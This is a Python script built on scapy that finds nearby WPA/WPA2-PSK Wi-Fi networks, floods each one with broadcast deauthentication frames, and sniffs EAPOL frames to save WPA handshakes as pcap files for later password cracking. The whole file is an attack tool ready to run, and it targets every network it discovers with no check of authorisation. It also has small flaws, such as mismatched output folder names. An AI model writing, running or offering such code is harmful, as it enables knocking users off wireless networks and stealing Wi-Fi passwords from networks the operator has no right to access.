from scapy.all import *
import os
import json
import time

Mon="wlan0"
Networks=[]
capture=False
ap=""
ap1=""
ap2=""

def WifiEnumerator(packet):
	global Networks
	if(packet.haslayer(Dot11Beacon)):
		bssid=packet[Dot11].addr2
		ssid=packet[Dot11Elt].info.decode()

		stats=packet[Dot11Beacon].network_stats()
		channel=stats.get("channel")
		crypto=stats.get("crypto")

		if("WPA/PSK" in crypto  or  "WPA2/PSK" in crypto):
			data={"bssid":bssid,"ssid":ssid,"channel":channel,"crypto":list(crypto)}
			Networks.append(data)

def write_networks():
	global Networks

	if (not os.path.exists("Networks/network.json")):
		print("*/Networks/network.json is created")
		os.system("sudo touch Networks/network.json" )
	with open ("Networks/network.json",'w') as f:
		f.write(json.dumps(Networks))

def deauth_attack(ap_mac,channel):
	global Networks
	global Mon

	os.system(f"sudo iwconfig {Mon} channel {channel}")
	packet=RadioTap()/Dot11(type=0,subtype=12,addr1="ff:ff:ff:ff:ff:ff",addr2=ap_mac,addr3=ap_mac)/Dot11Deauth()
	for i in range(2000):
		sendp(packet,iface=Mon,verbose=0)
		time.sleep(2)

def  WPA_Handshake(packet):
	global ap
	global ap1
	global ap2
	global capture
	global ap

	ap1=packet.addr1
	ap2=packet.addr2
	ap_mac_formatted=ap.replace(":","-")
	os.system(f"sudo touch  Handshake/handshake_{ap_mac_formatted}.pcap")
	pkt=PcapWriter(f"Handshake/handshake_{ap_mac_formatted}.pcap",append=True,sync=True)
	pkt.write(packet)
	if(not capture):
		handshake_cap=rdpcap(f"Handshake/handshake_{ap_mac_formatted}.pcap")
		#print("Running additional test for eapol files")
		(ap_to,ap_frm)=(0,0)
		for packets in handshake_cap:
			if(EAPOL in packets or packets.haslayer(EAPOL)):
				if(ap1==ap):
					ap_to+=1
				elif(ap2==ap):
					ap_frm+=1
		if(ap_to>=2 and ap_frm>=2):
			capture=True
		return capture

def Capture(ap_mac):
	global capture
	global Mon
	global ap1
	global ap2
	global ap
	ap=ap_mac
	ap_mac_formatted=ap_mac.replace(":","-")
	print("Capturing packets and checking eapol files......:")
	sniff(stop_filter=WPA_Handshake,iface=Mon,monitor=True,timeout=200)
	if( not capture):
		print("packets have been captured")
		print("Running additional test for EAPOL Files 2..........")
		handshake_cap=rdpcap(f"Handshake/handshake_{ap_mac_formatted}.pcap")
		(ap_to,ap_frm)=(0,0)
		for packets in handshake_cap:
			if(EAPOL in packets or packets.haslayer(EAPOL)):
				if(ap1==ap_mac):
					ap_to+=1
				elif(ap2==ap_mac):
					ap_frm+=1
		if(ap_to>=2 and ap_frm>=2):
			capture=True
	if(capture):
		print(f"WPA Handshake for {ap_mac} is successful")
		os.system(f"sudo cp Handshake/handshake_{ap_mac_formatted}.pcap Wpa_Capture/handshake_{ap_mac_formatted}.pcap")
		print(f"WPA_Capture saved in Wpa_Capture/handshake_{ap_mac_formatted}.pcap")
	else:
		print("Could not successfully found EAPOL files")
	return None

def start():
	global Networks
	global Mon
	global ap
	global capture


	sniff(prn=WifiEnumerator,iface=Mon,timeout=7)
	Networks=[i for n,i in enumerate(Networks) if i not in Networks[n+1:]]
	for net in Networks:
		print(net["bssid"],net["ssid"],net["channel"],net["crypto"],sep="    ")

	write_networks()

	print("Innitiating Deauthentication Attack \n\n")
	for net in Networks:
		capture=False
		bssid=net["bssid"]
		channel=net["channel"]
		ap=bssid
		print(f"{bssid}  {net['ssid']}")
		print(f"Trying to deauthenticate {net['ssid']}........ ")
		deauth=Thread(target=deauth_attack,args=(ap,channel))
		deauth.daemon=True
		deauth.start()
		Capture(bssid)
		print("<<<<<<<<<<>>>>>>>>\n")
		#deauth.join()
		#print("joined")

if __name__ == '__main__':

	if(not os.path.exists("Networks")):
		os.mkdir("Networks")
		print("Networks is created")

	if(not os.path.exists("Handshake")):
		os.mkdir("Handshake")
		print("Handshake is created")

	if(not os.path.exists("Wpa_Captured")):
		os.mkdir("Wpa_Captured")
		print("Wpa_Captured is created")
	print("\n")
	if(True):
		start()
